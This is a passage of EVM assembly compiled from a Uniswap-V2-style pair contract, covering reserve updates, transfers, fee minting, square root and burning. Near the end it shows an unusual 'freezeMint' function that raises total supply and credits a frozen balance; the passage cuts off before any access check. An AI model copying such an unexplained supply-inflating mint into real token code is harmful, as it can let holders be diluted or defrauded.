UQ112x112.encode(_reserve1) */\n      jump\t// in\n    tag_349:\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":3787:3820  UQ112x112.encode(_reserve1).uqdiv */\n      and\n      swap1\n        /* \"Pair.sol\":3787:3831  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      0xffffffff\n        /* \"Pair.sol\":3787:3820  UQ112x112.encode(_reserve1).uqdiv */\n      tag_351\n        /* \"Pair.sol\":3787:3831  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      and\n      jump\t// in\n    tag_348:\n        /* \"Pair.sol\":3742:3762  price0CumulativeLast */\n      0x0c\n        /* \"Pair.sol\":3742:3862  price0CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":3782:3832  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"Pair.sol\":3782:3862  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"Pair.sol\":3742:3862  price0CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"Pair.sol\":3916:3996  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      0xffffffff\n      dup2\n      and\n        /* \"Pair.sol\":3921:3965  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n      tag_352\n        /* \"Pair.sol\":3955:3964  _reserve1 */\n      dup5\n        /* \"Pair.sol\":3921:3948  UQ112x112.encode(_reserve0) */\n      tag_349\n        /* \"Pair.sol\":3938:3947  _reserve0 */\n      dup8\n        /* \"Pair.sol\":3921:3937  UQ112x112.encode */\n      tag_350\n        /* \"Pair.sol\":3921:3948  UQ112x112.encode(_reserve0) */\n      jump\t// in\n        /* \"Pair.sol\":3921:3965  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n    tag_352:\n        /* \"Pair.sol\":3876:3896  price1CumulativeLast */\n      0x0d\n        /* \"Pair.sol\":3876:3996  price1CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":3916:3966  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"Pair.sol\":3916:3996  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"Pair.sol\":3876:3996  price1CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"Pair.sol\":3611:4007  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n    tag_347:\n        /* \"Pair.sol\":4016:4024  reserve0 */\n      0x0b\n        /* \"Pair.sol\":4016:4044  reserve0 = uint112(balance0) */\n      dup1\n      sload\n      not(0xffffffffffffffffffffffffffff)\n      and\n      sub(shl(0x70, 0x01), 0x01)\n      dup9\n      dup2\n      and\n      swap2\n      swap1\n      swap2\n      or\n      not(shl(0x70, 0xffffffffffffffffffffffffffff))\n        /* \"Pair.sol\":4054:4082  reserve1 = uint112(balance1) */\n      and\n      shl(0x70, 0x01)\n      dup9\n      dup4\n      and\n      dup2\n      mul\n      swap2\n      swap1\n      swap2\n      or\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":4092:4127  blockTimestampLast = blockTimestamp */\n      and\n      shl(0xe0, 0x01)\n      0xffffffff\n      dup8\n      and\n      mul\n      or\n      swap3\n      dup4\n      swap1\n      sstore\n        /* \"Pair.sol\":4142:4166  Sync(reserve0, reserve1) */\n      0x40\n      dup1\n      mload\n        /* \"Pair.sol\":4147:4155  reserve0 */\n      dup5\n      dup5\n      and\n        /* \"Pair.sol\":4142:4166  Sync(reserve0, reserve1) */\n      dup2\n      mstore\n        /* \"Pair.sol\":4157:4165  reserve1 */\n      swap2\n      swap1\n      swap4\n      div\n      swap1\n      swap2\n      and\n        /* \"Pair.sol\":4142:4166  Sync(reserve0, reserve1) */\n      0x20\n      dup3\n      add\n      mstore\n      dup2\n      mload\n      0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\n      swap3\n      swap2\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log1\n        /* \"Pair.sol\":3190:4173  function _update(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_190:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_197:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_356\n      swap1\n        /* \"ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_177\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_356:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_357\n      swap1\n        /* \"ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_358\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_357:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"Pair.sol\":4259:5152  function _mintFee(... */\n    tag_214:\n        /* \"Pair.sol\":4354:4364  bool feeOn */\n      0x00\n        /* \"Pair.sol\":4376:4389  address feeTo */\n      dup1\n        /* \"Pair.sol\":4401:4408  factory */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":4392:4415  IFactory(factory).feeTo */\n      and\n      0x017e7e58\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_360\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_360:\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_361\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_361:\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_362\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_362:\n      pop\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      mload\n        /* \"Pair.sol\":4478:4483  kLast */\n      sload(0x0e)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":4435:4454  feeTo != address(0) */\n      dup3\n      and\n      iszero\n      dup1\n      iszero\n      swap5\n      pop\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      swap2\n      swap3\n      pop\n        /* \"Pair.sol\":4478:4483  kLast */\n      swap1\n        /* \"Pair.sol\":4508:5146  if (feeOn) {... */\n      tag_363\n      jumpi\n        /* \"Pair.sol\":4537:4548  _kLast != 0 */\n      dup1\n      iszero\n        /* \"Pair.sol\":4533:5079  if (_kLast != 0) {... */\n      tag_364\n      jumpi\n        /* \"Pair.sol\":4568:4578  uint rootK */\n      0x00\n        /* \"Pair.sol\":4581:4622  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      tag_365\n        /* \"Pair.sol\":4591:4621  uint(_reserve0).mul(_reserve1) */\n      tag_218\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":4591:4606  uint(_reserve0) */\n      dup9\n      dup2\n      and\n      swap1\n        /* \"Pair.sol\":4591:4621  uint(_reserve0).mul(_reserve1) */\n      dup9\n      and\n      0xffffffff\n        /* \"Pair.sol\":4591:4610  uint(_reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":4591:4621  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":4581:4622  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n    tag_365:\n        /* \"Pair.sol\":4568:4622  uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      swap1\n      pop\n        /* \"Pair.sol\":4640:4654  uint rootKLast */\n      0x00\n        /* \"Pair.sol\":4657:4674  Math.sqrt(_kLast) */\n      tag_367\n        /* \"Pair.sol\":4667:4673  _kLast */\n      dup4\n        /* \"Pair.sol\":4657:4666  Math.sqrt */\n      tag_219\n        /* \"Pair.sol\":4657:4674  Math.sqrt(_kLast) */\n      jump\t// in\n    tag_367:\n        /* \"Pair.sol\":4640:4674  uint rootKLast = Math.sqrt(_kLast) */\n      swap1\n      pop\n        /* \"Pair.sol\":4704:4713  rootKLast */\n      dup1\n        /* \"Pair.sol\":4696:4701  rootK */\n      dup3\n        /* \"Pair.sol\":4696:4713  rootK > rootKLast */\n      gt\n        /* \"Pair.sol\":4692:5065  if (rootK > rootKLast) {... */\n      iszero\n      tag_368\n      jumpi\n        /* \"Pair.sol\":4737:4751  uint numerator */\n      0x00\n        /* \"Pair.sol\":4754:4844  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      tag_369\n        /* \"Pair.sol\":4821:4822  8 */\n      0x08\n        /* \"Pair.sol\":4754:4791  totalSupply.mul(rootK.sub(rootKLast)) */\n      tag_182\n        /* \"Pair.sol\":4770:4790  rootK.sub(rootKLast) */\n      tag_371\n        /* \"Pair.sol\":4770:4775  rootK */\n      dup7\n        /* \"Pair.sol\":4780:4789  rootKLast */\n      dup7\n        /* \"Pair.sol\":4770:4790  rootK.sub(rootKLast) */\n      0xffffffff\n        /* \"Pair.sol\":4770:4779  rootK.sub */\n      tag_177\n        /* \"Pair.sol\":4770:4790  rootK.sub(rootKLast) */\n      and\n      jump\t// in\n    tag_371:\n        /* \"Pair.sol\":4754:4765  totalSupply */\n      sload(0x00)\n      swap1\n        /* \"Pair.sol\":4754:4791  totalSupply.mul(rootK.sub(rootKLast)) */\n      0xffffffff\n        /* \"Pair.sol\":4754:4769  totalSupply.mul */\n      tag_175\n        /* \"Pair.sol\":4754:4791  totalSupply.mul(rootK.sub(rootKLast)) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":4754:4844  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n    tag_369:\n        /* \"Pair.sol\":4737:4844  uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      swap1\n      pop\n        /* \"Pair.sol\":4866:4882  uint denominator */\n      0x00\n        /* \"Pair.sol\":4885:4920  rootK.mul(17).add(rootKLast.mul(8)) */\n      tag_372\n        /* \"Pair.sol\":4903:4919  rootKLast.mul(8) */\n      tag_373\n        /* \"Pair.sol\":4903:4912  rootKLast */\n      dup5\n        /* \"Pair.sol\":4917:4918  8 */\n      0x08\n        /* \"Pair.sol\":4903:4919  rootKLast.mul(8) */\n      0xffffffff\n        /* \"Pair.sol\":4903:4916  rootKLast.mul */\n      tag_175\n        /* \"Pair.sol\":4903:4919  rootKLast.mul(8) */\n      and\n      jump\t// in\n    tag_373:\n        /* \"Pair.sol\":4885:4898  rootK.mul(17) */\n      tag_374\n        /* \"Pair.sol\":4885:4890  rootK */\n      dup7\n        /* \"Pair.sol\":4895:4897  17 */\n      0x11\n        /* \"Pair.sol\":4885:4898  rootK.mul(17) */\n      0xffffffff\n        /* \"Pair.sol\":4885:4894  rootK.mul */\n      tag_175\n        /* \"Pair.sol\":4885:4898  rootK.mul(17) */\n      and\n      jump\t// in\n    tag_374:\n        /* \"Pair.sol\":4885:4902  rootK.mul(17).add */\n      swap1\n        /* \"Pair.sol\":4885:4920  rootK.mul(17).add(rootKLast.mul(8)) */\n      0xffffffff\n        /* \"Pair.sol\":4885:4902  rootK.mul(17).add */\n      tag_358\n        /* \"Pair.sol\":4885:4920  rootK.mul(17).add(rootKLast.mul(8)) */\n      and\n      jump\t// in\n    tag_372:\n        /* \"Pair.sol\":4866:4920  uint denominator = rootK.mul(17).add(rootKLast.mul(8)) */\n      swap1\n      pop\n        /* \"Pair.sol\":4942:4956  uint liquidity */\n      0x00\n        /* \"Pair.sol\":4971:4982  denominator */\n      dup2\n        /* \"Pair.sol\":4959:4968  numerator */\n      dup4\n        /* \"Pair.sol\":4959:4982  numerator / denominator */\n      dup2\n      tag_375\n      jumpi\n      invalid\n    tag_375:\n      div\n      swap1\n      pop\n        /* \"Pair.sol\":5008:5021  liquidity > 0 */\n      dup1\n      iszero\n        /* \"Pair.sol\":5004:5046  if (liquidity > 0) _mint(feeTo, liquidity) */\n      tag_377\n      jumpi\n        /* \"Pair.sol\":5023:5046  _mint(feeTo, liquidity) */\n      tag_377\n        /* \"Pair.sol\":5029:5034  feeTo */\n      dup8\n        /* \"Pair.sol\":5036:5045  liquidity */\n      dup3\n        /* \"Pair.sol\":5023:5028  _mint */\n      tag_221\n        /* \"Pair.sol\":5023:5046  _mint(feeTo, liquidity) */\n      jump\t// in\n    tag_377:\n        /* \"Pair.sol\":4692:5065  if (rootK > rootKLast) {... */\n      pop\n      pop\n      pop\n    tag_368:\n        /* \"Pair.sol\":4533:5079  if (_kLast != 0) {... */\n      pop\n      pop\n    tag_364:\n        /* \"Pair.sol\":4508:5146  if (feeOn) {... */\n      jump(tag_379)\n    tag_363:\n        /* \"Pair.sol\":5099:5110  _kLast != 0 */\n      dup1\n      iszero\n        /* \"Pair.sol\":5095:5146  if (_kLast != 0) {... */\n      tag_379\n      jumpi\n        /* \"Pair.sol\":5134:5135  0 */\n      0x00\n        /* \"Pair.sol\":5126:5131  kLast */\n      0x0e\n        /* \"Pair.sol\":5126:5135  kLast = 0 */\n      sstore\n        /* \"Pair.sol\":5095:5146  if (_kLast != 0) {... */\n    tag_379:\n        /* \"Pair.sol\":4259:5152  function _mintFee(... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n    tag_219:\n        /* \"Math.sol\":400:409  uint256 z */\n      0x00\n        /* \"Math.sol\":429:430  3 */\n      0x03\n        /* \"Math.sol\":425:426  y */\n      dup3\n        /* \"Math.sol\":425:430  y > 3 */\n      gt\n        /* \"Math.sol\":421:647  if (y > 3) {... */\n      iszero\n      tag_381\n      jumpi\n      pop\n        /* \"Math.sol\":450:451  y */\n      dup1\n        /* \"Math.sol\":485:486  1 */\n      0x01\n        /* \"Math.sol\":481:482  2 */\n      0x02\n        /* \"Math.sol\":477:482  y / 2 */\n      dup3\n      div\n        /* \"Math.sol\":477:486  y / 2 + 1 */\n      add\n        /* \"Math.sol\":500:589  while (x < z) {... */\n    tag_383:\n        /* \"Math.sol\":511:512  z */\n      dup2\n        /* \"Math.sol\":507:508  x */\n      dup2\n        /* \"Math.sol\":507:512  x < z */\n      lt\n        /* \"Math.sol\":500:589  while (x < z) {... */\n      iszero\n      tag_384\n      jumpi\n        /* \"Math.sol\":536:537  x */\n      dup1\n        /* \"Math.sol\":532:537  z = x */\n      swap2\n      pop\n        /* \"Math.sol\":573:574  2 */\n      0x02\n        /* \"Math.sol\":568:569  x */\n      dup2\n        /* \"Math.sol\":564:565  x */\n      dup3\n        /* \"Math.sol\":560:561  y */\n      dup6\n        /* \"Math.sol\":560:565  y / x */\n      dup2\n      tag_385\n      jumpi\n      invalid\n    tag_385:\n      div\n        /* \"Math.sol\":560:569  y / x + x */\n      add\n        /* \"Math.sol\":559:574  (y / x + x) / 2 */\n      dup2\n      tag_386\n      jumpi\n      invalid\n    tag_386:\n      div\n        /* \"Math.sol\":555:574  x = (y / x + x) / 2 */\n      swap1\n      pop\n        /* \"Math.sol\":500:589  while (x < z) {... */\n      jump(tag_383)\n    tag_384:\n        /* \"Math.sol\":421:647  if (y > 3) {... */\n      pop\n      jump(tag_388)\n    tag_381:\n        /* \"Math.sol\":609:615  y != 0 */\n      dup2\n      iszero\n        /* \"Math.sol\":605:647  if (y != 0) {... */\n      tag_388\n      jumpi\n      pop\n        /* \"Math.sol\":635:636  1 */\n      0x01\n        /* \"Math.sol\":605:647  if (y != 0) {... */\n    tag_388:\n        /* \"Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n    tag_221:\n        /* \"ERC20.sol\":1583:1594  totalSupply */\n      sload(0x00)\n        /* \"ERC20.sol\":1583:1605  totalSupply.add(value) */\n      tag_390\n      swap1\n        /* \"ERC20.sol\":1599:1604  value */\n      dup3\n        /* \"ERC20.sol\":1583:1605  totalSupply.add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":1583:1598  totalSupply.add */\n      tag_358\n        /* \"ERC20.sol\":1583:1605  totalSupply.add(value) */\n      and\n      jump\t// in\n    tag_390:\n        /* \"ERC20.sol\":1569:1580  totalSupply */\n      0x00\n        /* \"ERC20.sol\":1569:1605  totalSupply = totalSupply.add(value) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":1631:1644  balanceOf[to] */\n      dup4\n      and\n      dup2\n      mstore\n        /* \"ERC20.sol\":1631:1640  balanceOf */\n      0x01\n        /* \"ERC20.sol\":1631:1644  balanceOf[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      tag_391\n      swap1\n        /* \"ERC20.sol\":1649:1654  value */\n      dup3\n        /* \"ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":1631:1648  balanceOf[to].add */\n      tag_358\n        /* \"ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_391:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":1615:1628  balanceOf[to] */\n      dup4\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":1615:1624  balanceOf */\n      0x01\n        /* \"ERC20.sol\":1615:1628  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":1615:1655  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      dup4\n      mload\n      dup6\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"ERC20.sol\":1615:1628  balanceOf[to] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_228:\n        /* \"Math.sol\":192:201  uint256 z */\n      0x00\n        /* \"Math.sol\":221:222  y */\n      dup2\n        /* \"Math.sol\":217:218  x */\n      dup4\n        /* \"Math.sol\":217:222  x < y */\n      lt\n        /* \"Math.sol\":217:230  x < y ? x : y */\n      tag_393\n      jumpi\n        /* \"Math.sol\":229:230  y */\n      dup2\n        /* \"Math.sol\":217:230  x < y ? x : y */\n      jump(tag_394)\n    tag_393:\n        /* \"Math.sol\":225:226  x */\n      dup3\n        /* \"Math.sol\":217:230  x < y ? x : y */\n    tag_394:\n        /* \"Math.sol\":213:230  z = x < y ? x : y */\n      swap4\n        /* \"Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n    tag_252:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2277:2292  balanceOf[from] */\n      dup3\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2277:2286  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2277:2292  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      tag_396\n      swap1\n        /* \"ERC20.sol\":2297:2302  value */\n      dup3\n        /* \"ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2277:2296  balanceOf[from].sub */\n      tag_177\n        /* \"ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_396:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2259:2274  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2259:2268  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2259:2274  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup2\n      keccak256\n        /* \"ERC20.sol\":2259:2303  balanceOf[from] = balanceOf[from].sub(value) */\n      swap2\n      swap1\n      swap2\n      sstore\n        /* \"ERC20.sol\":2327:2338  totalSupply */\n      sload\n        /* \"ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      tag_397\n      swap1\n        /* \"ERC20.sol\":2343:2348  value */\n      dup3\n        /* \"ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2327:2342  totalSupply.sub */\n      tag_177\n        /* \"ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      and\n      jump\t// in\n    tag_397:\n        /* \"ERC20.sol\":2313:2324  totalSupply */\n      0x00\n        /* \"ERC20.sol\":2313:2349  totalSupply = totalSupply.sub(value) */\n      swap1\n      dup2\n      sstore\n        /* \"ERC20.sol\":2364:2397  Transfer(from, address(0), value) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      and\n      swap2\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap2\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":1714:2190  function freezeMint(... */\n    tag_303:\n        /* \"ERC20.sol\":1807:1811  bool */\n      0x00\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":1869:1890  account != address(0) */\n      dup4\n      and\n        /* \"ERC20.sol\":1861:1926  require(account != address(0), \"BEP20: mint to the zero address\") */\n      tag_399\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x42455032303a206d696e7420746f20746865207a65726f206164647265737300\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_399:\n        /* \"ERC20.sol\":2016:2027  totalSupply */\n      sload(0x00)\n        /* \"ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      tag_400\n      swap1\n        /* \"ERC20.sol\":2032:2038  amount */\n      dup4\n        /* \"ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      0xffffffff\n        /* \"ERC20.sol\":2016:2031  totalSupply.add */\n      tag_358\n        /* \"ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      and\n      jump\t// in\n    tag_400:\n        /* \"ERC20.sol\":2002:2013  totalSupply */\n      0x00\n        /* \"ERC20.sol\":2002:2039  totalSupply = totalSupply.add(amount) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2075:2098  _frozenBalance[account] */\n      dup5\n      and\n      dup2\n      mstore\n        /* \"ERC20.sol\":2075:2089  